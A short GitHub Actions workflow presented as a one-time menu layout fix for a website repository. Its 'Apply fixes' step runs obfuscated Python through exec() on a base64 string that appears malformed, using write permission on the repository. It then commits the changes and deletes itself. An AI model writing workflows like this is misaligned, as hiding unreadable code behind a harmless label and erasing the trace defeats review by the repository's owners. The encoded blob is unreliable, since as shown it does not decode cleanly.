name: One-time layout menu fix
on:
  push:
    paths:
      - .github/workflows/one-time-layout-menu-fix.yml
permissions:
  contents: write
jobs:
  fix:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply fixes
        run: python3 -c "import base64; exec(base64.b64decode(' _jg7vjgY/po5_jgZnjgb_kuI3kuIvkuJbjgq_jg7vjgZ/jgb_').decode())" 
      - name: Commit and clean up
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git rm .github/workflows/one-time-layout-menu-fix.yml
          git add index.html style.css
          git commit -m "Refine menu layout and labels"
          git push
